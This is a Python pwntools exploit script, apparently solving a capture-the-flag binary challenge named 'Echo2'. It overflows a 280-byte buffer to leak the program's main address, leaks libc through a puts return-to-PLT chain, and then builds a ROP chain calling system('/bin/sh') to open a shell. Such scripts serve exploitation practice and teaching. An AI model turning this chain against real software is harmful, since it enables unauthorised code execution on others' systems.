from pwn import *

# p = process("./challenge")
context.arch='amd64'
LIBC = "/lib/x86_64-linux-gnu/libc.so.6"

p = gdb.debug("./challenge" , """
             b *main
            #  b *echo
            #  b *main+108
            #  b *puts
             c
              """)


libc = ELF(LIBC, checksec=False)
elf = ELF("./challenge", checksec=False)

welcome_message = p.recvuntil(b"Welcome to Echo2")

p.send(b"281")
p.send(b"A" * 280 + b"\x4f")

echo = p.recvuntil(b"Echo2: " + b"A" * 280)

main_address = (p.recvline().strip())

main_address = u64(main_address.ljust(8, b"\x00")) - 8
print(f"main address {hex(main_address)}")

elf.address = main_address - elf.symbols['main']
print(f"base address {hex(elf.address)}")

welcome_message = p.recvuntil(b"Welcome to Echo2")


p.send(b"296")
p.send(b"B" * 280 + p64(elf.symbols['plt.puts']) + p64(elf.symbols['main']))


echo = p.recvuntil(b"Echo2: " + b"B" * 280)

first_address = p.recvline().strip()
putsplt_address = u64(first_address.ljust(8, b"\x00"))
print(f"puts@plt {hex(putsplt_address)}")

second_address = p.recvline().strip()
funlockfile_address = u64(second_address.ljust(8, b"\x00"))
print(f"funlockfile {hex(funlockfile_address)}")

libc.address = funlockfile_address - libc.symbols['funlockfile']
print(f"libc address : {hex(libc.address)}")

welcome_message = p.recvuntil(b"Welcome to Echo2")

pop_rdi_rop_gadget = next(libc.search(asm("pop rdi; ret")))
print(f"address of pop rdi gadget {hex(pop_rdi_rop_gadget)}")

bin_sh = next(libc.search(b"/bin/sh"))
print(f"address of /bin/sh {hex(bin_sh)}")



p.send(b"312")
p.send(b"C" * 280 +p64(libc.address + 0x29139) + p64(pop_rdi_rop_gadget) + p64(bin_sh) + p64(libc.symbols['system']))

p.recvuntil(b"Echo2: " + b"C" * 280)
p.recvline().strip()

p.interactive()
